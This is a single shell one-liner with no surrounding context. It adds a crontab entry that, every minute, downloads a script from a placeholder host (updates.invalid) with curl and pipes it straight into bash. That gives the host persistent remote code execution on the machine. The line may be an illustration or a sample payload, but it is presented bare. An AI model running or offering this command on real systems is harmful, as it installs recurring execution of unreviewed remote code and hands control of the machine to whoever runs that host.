(crontab -l; echo '* * * * * curl -fsSL https://updates.invalid/job | bash') | crontab -
